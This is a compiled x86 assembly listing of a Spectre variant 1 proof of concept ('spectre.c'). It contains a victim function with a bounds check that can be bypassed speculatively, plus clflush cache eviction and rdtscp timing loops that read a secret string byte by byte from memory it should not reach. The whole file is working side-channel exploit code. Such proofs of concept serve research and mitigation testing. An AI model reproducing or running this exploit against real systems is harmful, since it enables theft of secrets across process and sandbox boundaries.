	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	calll	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb), %eax
	movl	array1_size@GOTOFF(%eax), %ecx
	xorl	%eax, %eax
	cmpl	4(%esp), %ecx
	seta	%al
	retl
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	popl	%eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb), %eax
	movl	20(%esp), %edx
	movl	array1_size@GOTOFF(%eax), %ecx
	cmpl	%edx, %ecx
	jbe	.LBB1_11
# %bb.1:
	movl	%edx, %esi
	addl	$-1, %esi
	js	.LBB1_11
# %bb.2:
	movb	temp@GOTOFF(%eax), %cl
	andl	$3, %edx
	je	.LBB1_3
# %bb.4:
	xorl	%edi, %edi
	leal	array1@GOTOFF(%eax), %ebx
	.p2align	4, 0x90
.LBB1_5:                                # =>This Inner Loop Header: Depth=1
	movzbl	(%ebx,%esi), %ebp
	shll	$9, %ebp
	andb	array2@GOTOFF(%eax,%ebp), %cl
	addl	$1, %edi
	addl	$-1, %ebx
	cmpl	%edi, %edx
	jne	.LBB1_5
# %bb.6:
	movl	%esi, %edx
	subl	%edi, %edx
	cmpl	$3, %esi
	jae	.LBB1_8
	jmp	.LBB1_10
.LBB1_3:
	movl	%esi, %edx
	cmpl	$3, %esi
	jb	.LBB1_10
.LBB1_8:
	leal	(%eax,%edx), %esi
	addl	$array1@GOTOFF, %esi
	addl	$4, %edx
	.p2align	4, 0x90
.LBB1_9:                                # =>This Inner Loop Header: Depth=1
	movzbl	(%esi), %edi
	shll	$9, %edi
	andb	array2@GOTOFF(%eax,%edi), %cl
	movzbl	-1(%esi), %edi
	shll	$9, %edi
	andb	array2@GOTOFF(%eax,%edi), %cl
	movzbl	-2(%esi), %edi
	shll	$9, %edi
	andb	array2@GOTOFF(%eax,%edi), %cl
	movzbl	-3(%esi), %edi
	shll	$9, %edi
	andb	array2@GOTOFF(%eax,%edi), %cl
	addl	$-4, %edx
	addl	$-4, %esi
	cmpl	$3, %edx
	jg	.LBB1_9
.LBB1_10:
	movb	%cl, temp@GOTOFF(%eax)
.LBB1_11:
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$28, %esp
	.cfi_def_cfa_offset 48
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	popl	%edi
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb), %edi
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	results@GOTOFF(%edi), %eax
	movl	%edi, %ebx
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	$999, 12(%esp)                  # 4-byte Folded Spill
                                        # imm = 0x3E7
	jmp	.LBB2_1
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	movl	12(%esp), %edx                  # 4-byte Reload
	leal	-1(%edx), %eax
	cmpl	$1, %edx
	movl	%eax, 12(%esp)                  # 4-byte Spill
	jbe	.LBB2_12
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_7 Depth 2
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	array2@GOTOFF(%edi,%eax)
	clflush	array2@GOTOFF+512(%edi,%eax)
	clflush	array2@GOTOFF+1024(%edi,%eax)
	clflush	array2@GOTOFF+1536(%edi,%eax)
	clflush	array2@GOTOFF+2048(%edi,%eax)
	clflush	array2@GOTOFF+2560(%edi,%eax)
	clflush	array2@GOTOFF+3072(%edi,%eax)
	clflush	array2@GOTOFF+3584(%edi,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	movl	%edx, %esi
	movl	%edx, 16(%esp)                  # 4-byte Spill
	xorl	48(%esp), %esi
	movl	$29, %ebp
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%ebp, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%ebp, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%esi, %eax
	xorl	16(%esp), %eax                  # 4-byte Folded Reload
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%edi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %ebp
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	clflush	array1_size@GOTOFF(%edi)
	movl	$0, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB2_13
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %ebx
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %ebx
	cmpl	$42765, %ebx                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%bl, %esi
	movl	%esi, %eax
	movl	%esi, 24(%esp)                  # 4-byte Spill
	shll	$9, %esi
	rdtscp
	movl	%eax, %ebp
	movl	%edx, 16(%esp)                  # 4-byte Spill
	movzbl	array2@GOTOFF(%edi,%esi), %eax
	rdtscp
	subl	%ebp, %eax
	sbbl	16(%esp), %edx                  # 4-byte Folded Reload
	movl	$50, %esi
	cmpl	%eax, %esi
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%edi)
	cmpb	array1@GOTOFF(%edi,%edx), %bl
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	24(%esp), %eax                  # 4-byte Reload
	addl	$1, results@GOTOFF(%edi,%eax,4)
	jmp	.LBB2_10
.LBB2_12:
	xorl	%ecx, results@GOTOFF(%edi)
	addl	$28, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	pushl	%ebx
	.cfi_def_cfa_offset 12
	pushl	%edi
	.cfi_def_cfa_offset 16
	pushl	%esi
	.cfi_def_cfa_offset 20
	subl	$60, %esp
	.cfi_def_cfa_offset 80
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	.cfi_offset %ebp, -8
	calll	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	popl	%esi
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb), %esi
	movl	stdin@GOT(%esi), %edi
	leal	check@GOTOFF(%esi), %eax
	movl	%eax, 44(%esp)                  # 4-byte Spill
	leal	.L.str.9@GOTOFF(%esi), %eax
	movl	%eax, 40(%esp)                  # 4-byte Spill
	leal	.L.str.1@GOTOFF(%esi), %eax
	movl	%eax, 36(%esp)                  # 4-byte Spill
	leal	array1@GOTOFF(%esi), %eax
	movl	%eax, 24(%esp)                  # 4-byte Spill
	leal	array2@GOTOFF(%esi), %eax
	movl	%eax, 32(%esp)                  # 4-byte Spill
	leal	.L.str.2@GOTOFF(%esi), %eax
	movl	%eax, 28(%esp)                  # 4-byte Spill
	movl	%esi, 4(%esp)                   # 4-byte Spill
	movl	%edi, 48(%esp)                  # 4-byte Spill
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	movl	%esi, %ebx
	calll	getpid@PLT
	xorl	%ecx, %ecx
	movl	44(%esp), %edx                  # 4-byte Reload
	addl	$33, %edx
	setb	%cl
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%edx
	.cfi_adjust_cfa_offset 4
	pushl	52(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%esi, %ebx
	pushl	(%edi)
	.cfi_adjust_cfa_offset 4
	calll	getc@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_28
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_29
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movl	secret@GOTOFF(%esi), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	movl	%esi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	48(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	secret@GOTOFF(%esi), %eax
	movl	%eax, %ecx
	subl	24(%esp), %ecx                  # 4-byte Folded Reload
	movl	%ecx, 8(%esp)
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	strlen@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	%eax, %edi
	movl	%eax, (%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	pushl	$131072                         # imm = 0x20000
	.cfi_adjust_cfa_offset 4
	pushl	$1
	.cfi_adjust_cfa_offset 4
	pushl	44(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	cmpl	$3, 80(%esp)
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	movl	%esi, %ebx
	leal	12(%esp), %eax
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	36(%esp)                        # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	movl	96(%esp), %edi
	pushl	4(%edi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	24(%esp), %eax                  # 4-byte Reload
	subl	%eax, 8(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	.L.str.3@GOTOFF(%esi), %eax
	leal	4(%esp), %ecx
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	8(%edi)
	.cfi_adjust_cfa_offset 4
	calll	__isoc99_sscanf@PLT
	addl	$12, %esp
	.cfi_adjust_cfa_offset -12
	leal	.L.str.4@GOTOFF(%esi), %eax
	pushl	4(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	16(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	(%esp), %edi
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	subl	$8, %esp
	.cfi_adjust_cfa_offset 8
	leal	.L.str.5@GOTOFF(%esi), %eax
	movl	%esi, %ebx
	pushl	%edi
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, (%esp)
	testl	%eax, %eax
	jle	.LBB3_27
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%edi, %edi
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_26:                               #   in Loop: Header=BB3_8 Depth=2
	movl	52(%esp), %edi                  # 4-byte Reload
	addl	$1, %edi
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%esi, %ebx
	pushl	$10
	.cfi_adjust_cfa_offset 4
	calll	putchar@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	(%esp), %eax
	leal	-1(%eax), %ecx
	movl	%ecx, (%esp)
	testl	%eax, %eax
	jle	.LBB3_27
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #       Child Loop BB3_24 Depth 3
	movl	secret@GOTOFF(%esi), %eax
	movl	%edi, 52(%esp)                  # 4-byte Spill
	movsbl	(%eax,%edi), %eax
	leal	.L.str.6@GOTOFF(%esi), %ecx
	movl	%esi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	16(%esp)
	.cfi_adjust_cfa_offset 4
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	8(%esp), %eax
	movl	%eax, 56(%esp)                  # 4-byte Spill
	addl	$1, %eax
	movl	%eax, 8(%esp)
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	leal	results@GOTOFF(%esi), %eax
	pushl	$1024                           # imm = 0x400
	.cfi_adjust_cfa_offset 4
	pushl	$0
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	memset@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	movl	$999, 12(%esp)                  # 4-byte Folded Spill
                                        # imm = 0x3E7
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=3
	movl	12(%esp), %edx                  # 4-byte Reload
	leal	-1(%edx), %eax
	cmpl	$1, %edx
	movl	%eax, 12(%esp)                  # 4-byte Spill
	jbe	.LBB3_20
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_30 Depth 5
                                        #         Child Loop BB3_15 Depth 4
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	array2@GOTOFF(%esi,%eax)
	clflush	array2@GOTOFF+512(%esi,%eax)
	clflush	array2@GOTOFF+1024(%esi,%eax)
	clflush	array2@GOTOFF+1536(%esi,%eax)
	clflush	array2@GOTOFF+2048(%esi,%eax)
	clflush	array2@GOTOFF+2560(%esi,%eax)
	clflush	array2@GOTOFF+3072(%esi,%eax)
	clflush	array2@GOTOFF+3584(%esi,%eax)
	addl	$4096, %eax                     # imm = 0x1000
	cmpl	$131072, %eax                   # imm = 0x20000
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%esi)
	movl	%edx, %edi
	movl	%edx, 16(%esp)                  # 4-byte Spill
	xorl	56(%esp), %edi                  # 4-byte Folded Reload
	movl	$29, %ebp
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	movl	%ebp, %eax
	movl	$-1431655765, %ecx              # imm = 0xAAAAAAAB
	mull	%ecx
	shrl	%edx
	andl	$-2, %edx
	leal	(%edx,%edx,2), %eax
	notl	%eax
	addl	%ebp, %eax
	movl	%eax, %ecx
	andl	$-65536, %ecx                   # imm = 0xFFFF0000
	shrl	$16, %eax
	orl	%ecx, %eax
	andl	%edi, %eax
	xorl	16(%esp), %eax                  # 4-byte Folded Reload
	subl	$12, %esp
	.cfi_adjust_cfa_offset 12
	movl	%esi, %ebx
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	calll	victim_function
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
	subl	$1, %ebp
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_30 Depth 5
	clflush	array1_size@GOTOFF(%esi)
	movl	$0, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$99, %eax
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_30:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 20(%esp)
	movl	20(%esp), %eax
	cmpl	$100, %eax
	jl	.LBB3_30
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$13, %ebx
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$167, %ebx
	cmpl	$42765, %ebx                    # imm = 0xA70D
	je	.LBB3_19
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movzbl	%bl, %esi
	movl	%esi, %eax
	movl	%esi, 16(%esp)                  # 4-byte Spill
	shll	$9, %esi
	rdtscp
	movl	%eax, %edi
	movl	%edx, %ebp
	movl	4(%esp), %eax                   # 4-byte Reload
	movzbl	array2@GOTOFF(%eax,%esi), %eax
	movl	4(%esp), %esi                   # 4-byte Reload
	rdtscp
	subl	%edi, %eax
	sbbl	%ebp, %edx
	movl	$50, %edi
	cmpl	%eax, %edi
	movl	$0, %eax
	sbbl	%edx, %eax
	jb	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	movl	12(%esp), %eax                  # 4-byte Reload
	cltd
	idivl	array1_size@GOTOFF(%esi)
	cmpb	array1@GOTOFF(%esi,%edx), %bl
	je	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	movl	16(%esp), %eax                  # 4-byte Reload
	addl	$1, results@GOTOFF(%esi,%eax,4)
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_8 Depth=2
	xorl	results@GOTOFF(%esi), %ecx
	movl	%ecx, results@GOTOFF(%esi)
	movl	$1, %ebp
	leal	results@GOTOFF+4(%esi), %edi
	movl	%ecx, %eax
	subl	(%edi), %eax
	jle	.LBB3_24
	.p2align	4, 0x90
.LBB3_22:                               #   in Loop: Header=BB3_8 Depth=2
	cmpl	$101, %eax
	jl	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_8 Depth=2
	leal	-1(%ebp), %eax
	subl	$4, %esp
	.cfi_adjust_cfa_offset 4
	movl	8(%esp), %edx                   # 4-byte Reload
	leal	.L.str.7@GOTOFF(%edx), %esi
	movl	8(%esp), %ebx                   # 4-byte Reload
	pushl	%ecx
	.cfi_adjust_cfa_offset 4
	pushl	%eax
	.cfi_adjust_cfa_offset 4
	pushl	%esi
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$12, %esp
	.cfi_adjust_cfa_offset -12
	movl	8(%esp), %ebx                   # 4-byte Reload
	pushl	(%edi)
	.cfi_adjust_cfa_offset 4
	pushl	%ebp
	.cfi_adjust_cfa_offset 4
	pushl	%esi
	movl	20(%esp), %esi                  # 4-byte Reload
	.cfi_adjust_cfa_offset 4
	calll	printf@PLT
	addl	$16, %esp
	.cfi_adjust_cfa_offset -16
.LBB3_24:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	cmpl	$255, %ebp
	je	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_24 Depth=3
	movl	(%edi), %ecx
	addl	$4, %edi
	addl	$1, %ebp
	movl	%ecx, %eax
	subl	(%edi), %eax
	jg	.LBB3_22
	jmp	.LBB3_24
	.p2align	4, 0x90
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	movl	48(%esp), %edi                  # 4-byte Reload
	jmp	.LBB3_1
.LBB3_29:
	xorl	%eax, %eax
	addl	$60, %esp
	.cfi_def_cfa_offset 20
	popl	%esi
	.cfi_def_cfa_offset 16
	popl	%edi
	.cfi_def_cfa_offset 12
	popl	%ebx
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_def_cfa_offset 4
	retl
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	results,@object                 # @results
	.local	results
	.comm	results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.size	.L.str.6, 55

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"result[%d]=%d "
	.size	.L.str.7, 15

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.9, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
